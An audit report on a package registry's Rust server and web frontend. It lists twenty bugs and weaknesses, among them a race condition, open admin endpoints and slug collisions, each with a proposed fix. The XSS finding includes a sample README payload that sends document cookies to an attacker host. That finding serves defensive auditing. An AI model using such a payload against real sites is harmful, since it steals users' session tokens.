# TSX Project — Comprehensive Audit Report

**Date**: 2026-03-17
**Scope**: Full codebase review — bugs, missing features, inconsistencies, security issues
**Project**: Universal Framework Protocol CLI + Registry Server + Web Apps

---

## Project Structure Overview

```
tsx/
├── src/                        # Rust CLI (tsx binary)
├── crates/
│   ├── forge/                  # Tera-based 4-tier template codegen engine
│   └── registry-server/        # Axum + PostgreSQL registry backend
│       └── src/
│           ├── db/             # Database layer (packages, users, stats)
│           └── routes/         # API route handlers
└── apps/
    ├── registry-web/           # TanStack Start registry frontend
    └── docs/                   # Documentation site
```

---

## SEVERITY LEGEND

| Severity | Meaning |
|----------|---------|
| **CRITICAL** | Data loss, crash, or service outage possible |
| **HIGH** | Security vulnerability or serious bug |
| **MEDIUM** | Functional bug or security weakness |
| **LOW** | Code quality, UX, or minor inconsistency |

---

## CRITICAL ISSUES

### C-1 · Race Condition — Tarball Write vs DB Commit

**File**: `crates/registry-server/src/routes/packages.rs:425-469`
**Severity**: CRITICAL

The tarball file write and the database upsert are not atomic. If the file write succeeds but the DB commit fails (or vice versa), the system ends up in an inconsistent state.

```rust
// File written at line ~432
if let Err(e) = tokio::fs::write(&tarball_path, &tarball_bytes).await {
    return err500(format!("Failed to write tarball: {}", e));
}
// DB upsert at line ~451 — separate operation, no rollback on file failure
```

**Scenario**: Tarball written to disk → DB upsert fails → package entry missing → orphaned file on disk.
Or: DB record created → server restarts before file write → package listed but download returns 500.

**Fix**: Write tarball to a temp path first. Only rename/move it into the final path *after* the DB transaction commits successfully. Roll back (delete temp file) if DB fails.

---

## HIGH SEVERITY ISSUES

### H-1 · XSS — Unsanitized Markdown Rendered as Raw HTML

**File**: `apps/registry-web/src/routes/packages/$name.tsx:85`
**Severity**: HIGH

README content from the registry is converted with `marked.parse()` and injected directly into the DOM via `dangerouslySetInnerHTML` without any HTML sanitization.

```typescript
const readmeHtml = readme ? marked.parse(readme) as string : null
// ...
<div dangerouslySetInnerHTML={{ __html: readmeHtml }} />
```

A malicious package author can publish a README containing an XSS payload:

```markdown
## Usage
<img src=x onerror="fetch('https://attacker.com/steal?token='+document.cookie)" />
```

Any user (including admins) who views the package detail page will have the script execute in their browser, potentially leaking auth tokens or session cookies.

**Fix**:
```typescript
import DOMPurify from 'dompurify';

const readmeHtml = readme
  ? DOMPurify.sanitize(marked.parse(readme) as string)
  : null;
```

Install: `bun add dompurify @types/dompurify` in `apps/registry-web`. fallback pnpm

---

### H-2 · Silent Multipart Field Errors Give Misleading Feedback

**File**: `crates/registry-server/src/routes/packages.rs:386-394`
**Severity**: HIGH

All multipart field reads use `.unwrap_or_default()`, silently converting I/O errors into empty strings or empty byte arrays.

```rust
while let Ok(Some(field)) = multipart.next_field().await {
    match field.name() {
        Some("name")     => name = field.text().await.unwrap_or_default(),
        Some("version")  => version = field.text().await.unwrap_or_default(),
        Some("manifest") => manifest_str = field.text().await.unwrap_or_default(),
        Some("tarball")  => tarball_bytes = field.bytes().await.unwrap_or_default().to_vec(),
        _ => {}
    }
}
```

When a real network or encoding error occurs, the handler proceeds with empty data and eventually returns "Missing required fields" — hiding the actual cause. Debugging production upload failures becomes very difficult.

**Fix**: Propagate errors explicitly:
```rust
Some("manifest") => match field.text().await {
    Ok(text) => manifest_str = text,
    Err(e) => return err400(format!("Failed to read manifest: {e}")),
},
```

---

## MEDIUM SEVERITY ISSUES

### M-1 · Slug Collision on Scoped Package Names

**File**: `crates/registry-server/src/routes/packages.rs:417`
**Severity**: MEDIUM

Tarball storage slugs are derived by taking only the **last** path component of the package name:

```rust
let slug = name.split('/').last().unwrap_or(&name).to_string();
```

Two different packages can produce the same slug:
- `@tsx-pkg/auth` → slug `auth`
- `@other-scope/auth` → slug `auth`

Both write to `data/tarballs/auth/{version}.tar.gz`. The second publish silently overwrites the first package's tarball.

**Fix**: Build a slug that encodes the full name:
```rust
let slug = name.trim_start_matches('@').replace('/', "__");
// "@tsx-pkg/auth" → "tsx-pkg__auth"
```

---

### M-2 · Admin Endpoints Completely Open When API Key Not Configured

**File**: `crates/registry-server/src/routes/admin.rs:82-99`
**Severity**: MEDIUM

The `require_admin_key` guard only enforces the check **if** the env var `TSX_REGISTRY_API_KEY` is set:

```rust
fn require_admin_key(state: &Arc<AppState>, headers: &HeaderMap) -> Result<(), ...> {
    if let Some(expected) = &state.api_key {   // ← skipped entirely if None
        // ... check header
    }
    Ok(())  // ← always passes when env var is absent
}
```

In any deployment where the env var is not set (dev/staging/misconfigured prod), the admin audit log and rate limit management endpoints are fully public — exposing all IP addresses and user actions.

**Fix**: Fail closed — return `UNAUTHORIZED` if no key is configured:
```rust
let expected = state.api_key.as_ref().ok_or_else(|| (
    StatusCode::UNAUTHORIZED,
    Json(json!({"error": "Admin access not configured"})),
))?;
```

---

### M-3 · No File Type or Size Validation on Tarball Upload

**File**: `crates/registry-server/src/routes/packages.rs:391`
**Severity**: MEDIUM

The server accepts any bytes as a "tarball" with no size limit and no magic-byte check:

```rust
Some("tarball") => tarball_bytes = field.bytes().await.unwrap_or_default().to_vec(),
```

- **DoS / storage exhaustion**: An attacker can upload an arbitrarily large file, filling disk.
- **Integrity**: A corrupted or non-gzip file is stored and will fail silently at install time.

**Fix**:
```rust
// After collecting bytes:
const MAX_TARBALL: usize = 100 * 1024 * 1024; // 100 MB
if tarball_bytes.len() > MAX_TARBALL {
    return err400("Tarball exceeds 100 MB limit");
}
// Validate gzip magic bytes (0x1f 0x8b)
if tarball_bytes.len() < 2 || tarball_bytes[0] != 0x1f || tarball_bytes[1] != 0x8b {
    return err400("Tarball must be a valid .tar.gz file");
}
```

---

### M-4 · Package Author Check Skipped for Author-less Packages

**File**: `crates/registry-server/src/routes/packages.rs:150-154`
**Severity**: MEDIUM

The `PATCH /v1/packages/:name` (update README) handler only enforces ownership when `author_id` is set:

```rust
if let Some(ref uid) = pkg.author_id {
    if auth.as_ref().map(|u| &u.user_id) != Some(uid) {
        return err403("Only the package author may update the README");
    }
}
// Falls through with Ok if author_id is NULL
```

Any package published anonymously (possible when the registry is in open mode) can be modified by any authenticated user.

**Fix**: Add an explicit `None` branch that either denies all modification or requires admin:
```rust
match pkg.author_id {
    Some(ref uid) => {
        if auth.as_ref().map(|u| &u.user_id) != Some(uid) {
            return err403("Only the package author may update this package");
        }
    }
    None => return err403("Package has no owner — contact an admin to update it"),
}
```

---

### M-5 · In-Memory Rate Limiter Is Trivially Bypassable

**File**: `crates/registry-server/src/routes/packages.rs:356-372`
`crates/registry-server/src/main.rs:113`
**Severity**: MEDIUM

The publish rate limiter uses an in-memory `HashMap<IpAddr, (u32, Instant)>`:

```rust
pub rate_limiter: std::sync::Mutex<HashMap<std::net::IpAddr, (u32, Instant)>>,
```

Problems:
1. **Reset on restart** — restarting the server clears all counters.
2. **IP rotation bypass** — each new IP gets a fresh counter.
3. **No global limit** — there is no cap on total publishes across all IPs.
4. **Mutex contention** — under high concurrency the single lock is a bottleneck.

**Fix**: Persist rate limit state in the database (or Redis). At minimum, add a global publish counter per user ID (not just per IP).

---

### M-6 · No Structured Logging in Route Handlers

**File**: All files under `crates/registry-server/src/routes/`
**Severity**: MEDIUM

No calls to `tracing::info!`, `tracing::warn!`, or `tracing::error!` exist in any route handler. Production debugging relies entirely on HTTP status codes without any context.

Missing log points include:
- Successful package publish (who, what version)
- Failed authentication attempts
- Rate limit triggers (who, which IP)
- File I/O errors during upload/download
- Admin access events

**Fix**: Add `tracing` instrumentation at key points:
```rust
tracing::info!(user = %auth_user.user_id, package = %name, version = %version, "Package published");
tracing::warn!(ip = %ip, "Rate limit exceeded");
```

---

### M-7 · DB Version Sort Implicitly Depends on get_versions Ordering

**File**: `crates/registry-server/src/db/packages.rs:273-275`
**Severity**: MEDIUM

`get_recent()` calls `get_versions()` and assumes the first element is the latest:

```rust
let latest = get_versions(pool, pkg.id)
    .await?
    .into_iter()
    .next()
    .map(|v| v.version)
    .unwrap_or_else(|| "unknown".to_string());
```

`get_versions()` does sort by semver DESC (line 235), but this is implicit coupling. If the sort order changes or a parse error causes a fallback to date sort, `get_recent()` silently returns a wrong "latest" version.

**Fix**: Add a dedicated `get_latest_version(pool, pkg_id)` DB function that returns the highest semver explicitly.

---

## LOW SEVERITY ISSUES

### L-1 · Frontend Semver Regex Is Not Anchored

**File**: `apps/registry-web/src/routes/_protected/publish/index.tsx:59`
**Severity**: LOW

```typescript
if (!data.version.match(/^\d+\.\d+\.\d+/))
    e.version = "Must be a valid semver (e.g. 1.0.0)."
```

The regex is not end-anchored (`$`), so `1.0.0abc` passes frontend validation but fails the strict `semver::Version::parse()` on the backend, producing a confusing error.

**Fix**:
```typescript
if (!data.version.match(/^\d+\.\d+\.\d+(-[\w.]+)?(\+[\w.]+)?$/))
```

---

### L-2 · setTimeout Without Cleanup in Copy Button

**File**: `apps/registry-web/src/routes/packages/$name.tsx:63`
**Severity**: LOW

```typescript
function copy() {
    navigator.clipboard.writeText(text)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)  // no cleanup
}
```

If the component unmounts before 2 seconds elapse, the callback fires on an unmounted component. While React 18 suppresses this warning, it is still a stale-closure/memory-leak pattern.

**Fix**: Use a `useRef` to store the timer and clear it in a `useEffect` cleanup.

---

### L-3 · No Runtime Validation on API Response Shapes

**File**: `apps/registry-web/src/lib/api.ts:5-8`
**Severity**: LOW

```typescript
async function fetchJson<T>(path: string): Promise<T> {
    const res = await fetch(`${BASE_URL}${path}`)
    if (!res.ok) throw new Error(`Registry API error ${res.status}: ${await res.text()}`)
    return res.json() as Promise<T>
}
```

`res.json() as Promise<T>` is a TypeScript cast, not a runtime check. If the server returns a shape different from `T` (null fields, missing keys), components receive `undefined` at runtime while TypeScript believes the type is correct, causing silent rendering failures.

**Fix**: Validate responses with Zod at the API boundary:
```typescript
async function fetchJson<T>(path: string, schema: z.ZodType<T>): Promise<T> {
    const res = await fetch(`${BASE_URL}${path}`)
    if (!res.ok) throw new Error(await res.text())
    return schema.parse(await res.json())
}
```

---

### L-4 · Inconsistent Error Response Shapes Across Endpoints

**File**: Multiple route handlers in `crates/registry-server/src/routes/`
**Severity**: LOW

Error responses are not consistent:
- Most endpoints return `{"error": "message string"}`
- Some serialization errors produce nested shapes: `{"error": {"error": "message"}}`
- Download endpoint (`GET /v1/packages/:name/download`) returns raw text on error

The TypeScript client (`apps/registry-web/src/lib/api.ts`) uses `res.text()` to handle errors, which works but means the JSON error structure is never parsed.

**Fix**: Define a single `ApiError { error: String }` type and ensure all handlers use it uniformly. Add a test that every endpoint returns this shape on error.

---

### L-5 · Hardcoded Magic Numbers Throughout Route Handlers

**File**: `crates/registry-server/src/routes/packages.rs`, `routes/search.rs`
**Severity**: LOW

Constants scattered inline:
- `10` — publish rate limit per minute (`packages.rs:366`)
- `50` — max page size (`packages.rs:45`, `search.rs:41`)
- `90` — max days for download stats (`packages.rs:287`)
- `20` — default page size (`search.rs:41`)

These should be named constants or env-var-configurable values for easy tuning in production.

---

### L-6 · Missing Error Handling on `serde_json::to_value` Calls

**File**: Multiple locations in `crates/registry-server/src/routes/`
**Severity**: LOW

22 instances of `serde_json::to_value(...).unwrap()` across:
- `packages.rs`: lines 52, 56, 74, 101, 294, 369, 400, 406, 413, 517, 532, 568, 575, 582
- `admin.rs`: lines 31, 34, 77, 94
- `search.rs`: lines 56, 70
- `stats.rs`: lines 12, 15

While `ApiError` and `Package` types are unlikely to fail serialization, panics in error paths are particularly bad. Replace with `.expect("BUG: ApiError must serialize")` to give a clear message if it ever fires.

---

### L-7 · No Draft Recovery on Publish Form

**File**: `apps/registry-web/src/routes/_protected/publish/index.tsx:279-281`
**Severity**: LOW

The 4-step publish wizard has no draft persistence. If a network error occurs during the upload step, all entered data (name, description, manifest, selected files) is lost on page reload.

**Fix**: Persist step state to `localStorage` on each change and restore on mount.

---

### L-8 · No OpenAPI / Schema Contract for Registry API

**Severity**: LOW

The registry server has no OpenAPI specification. This means:
- No auto-generated client code for external consumers
- No contract testing between registry-web and registry-server
- API shape mismatches are caught only at runtime

**Fix**: Add `utoipa` crate to the registry-server for auto-generated OpenAPI from route annotations.

---

### L-9 · No Package Tarball Content Validation After Upload

**File**: `crates/registry-server/src/routes/packages.rs:391`
**Severity**: LOW

Beyond magic-byte checking (see M-3), the server does not verify that:
- The tarball can actually be decompressed
- The tarball contains the files listed in `manifest.json`
- `manifest.json` inside the tarball matches the posted manifest

A corrupted upload is accepted and stored; the error only surfaces when a client tries to install the package.

---

### L-10 · `get_versions` Sort Fallback Is Fragile

**File**: `crates/registry-server/src/db/packages.rs:235-240`
**Severity**: LOW

```rust
rows.sort_by(|a, b| {
    match (semver::Version::parse(&a.version), semver::Version::parse(&b.version)) {
        (Ok(va), Ok(vb)) => vb.cmp(&va),
        _ => b.published_at.cmp(&a.published_at),   // ← mixed fallback
    }
});
```

If one version string parses and the other does not, they fall into the `_` arm and sort by date — meaning a bad version string can float to the "top" if published recently. The `published_at` fallback mixes versions that failed to parse with versions that succeeded.

**Fix**: Separate valid and invalid versions; sort valid ones by semver, then append invalid ones at the end.

---

## SECURITY SUMMARY

| ID | Issue | Severity | File |
|----|-------|----------|------|
| H-1 | XSS via unsanitized README HTML | **HIGH** | `apps/registry-web/src/routes/packages/$name.tsx:85` |
| H-2 | Multipart errors silently swallowed | **HIGH** | `crates/registry-server/src/routes/packages.rs:386` |
| M-1 | Tarball slug collision → package overwrite | **MEDIUM** | `packages.rs:417` |
| M-2 | Admin endpoints open when API key not set | **MEDIUM** | `admin.rs:82` |
| M-3 | No file size or type validation → DoS | **MEDIUM** | `packages.rs:391` |
| M-4 | Author-less packages modifiable by anyone | **MEDIUM** | `packages.rs:150` |
| M-5 | Rate limiter bypassable via IP rotation / restart | **MEDIUM** | `main.rs:113` |

---

## ISSUE COUNT SUMMARY

| Severity | Count |
|----------|-------|
| CRITICAL | 1 (C-1) |
| HIGH | 2 (H-1, H-2) |
| MEDIUM | 7 (M-1 through M-7) |
| LOW | 10 (L-1 through L-10) |
| **Total** | **20** |

---

## RECOMMENDED PRIORITY ORDER

**Immediate** (before production launch):
1. **H-1** — Add DOMPurify to prevent XSS
2. **C-1** — Make tarball write + DB insert atomic
3. **M-2** — Fail closed on admin endpoints when API key is absent
4. **M-3** — Add file size + magic-byte validation

**Short term**:
5. **M-1** — Fix slug collision logic
6. **M-4** — Fix author-less package ownership check
7. **H-2** — Propagate multipart read errors properly
8. **M-5** — Move rate limiter to database

**Backlog**:
9. **M-6** — Add structured logging
10. **L-1** — Fix semver regex anchor
11. **L-3** — Add Zod runtime validation on API responses
12. **L-4** — Standardize error response shapes
13. Remaining LOW items as time permits

---

## POSITIVE FINDINGS

- Rust type system prevents entire classes of null-pointer and memory bugs
- Zod validation is used on all publish form fields (good)
- Database schema uses appropriate UNIQUE and FOREIGN KEY constraints
- Admin role middleware is properly implemented and applied consistently
- JWT token verification is correctly implemented
- Docker + deployment configuration is present and reasonable
- Semver comparison library (`semver` crate) is used rather than hand-rolled parsing
